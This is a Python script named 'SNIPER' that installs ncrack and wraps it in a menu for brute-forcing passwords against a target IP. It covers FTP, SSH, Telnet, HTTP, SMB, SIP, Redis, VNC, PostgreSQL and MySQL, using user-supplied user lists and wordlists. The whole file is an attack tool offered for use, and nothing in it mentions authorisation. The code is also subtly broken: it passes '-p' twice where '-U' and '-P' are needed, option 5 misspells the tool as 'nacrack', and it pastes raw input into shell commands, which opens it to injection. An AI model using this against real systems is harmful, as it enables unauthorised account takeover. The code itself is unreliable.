#!/usr/bin/env python
import os
os.system("apt-get install ncrack")
os.system("clear")
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet SNIPER")

print("""
WELCOME TO THE SNIPER:)

1)FTP
2)SSH
3)TELNET
4)HTTP
5)SMB
6)SIP
7)REDIS
8)VNC 
9)PostgreSQL
10)MySQL

""")

moveno = input("enter movement: ")
targetip = input("enter target ip: ")
username = input("enter the user filepath:")
passwd = input("enter the wordlist path:")

if(moveno == "1"):
    os.system("ncrack -p 21 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "2"):
    os.system("ncrack -p 22 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "3"):
    os.system("ncrack -p 23 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "4"):
    os.system("ncrack -p 80 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "5"):
    os.system("nacrack -p 139 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "6"):
    os.system("ncrack -p 5060 -u " + username + " -p " + passwd + " " + targetip)
elif(moveno == "7"):
    os.system("ncrack -p 6379 -u " + username + " -p " + passwd + " " + targetip)
elif (moveno == "8"):
    os.system("ncrack -p 5900 -u " + username + " -p " + passwd + " " + targetip)
elif (moveno == "9"):
    os.system("ncrack -p 5432 -u " + username + " -p " + passwd + " " + targetip)
elif (moveno == "10"):
    os.system("ncrack -p 3306 -u " + username + " -p " + passwd + " " + targetip)
else:print("ERROR!!!")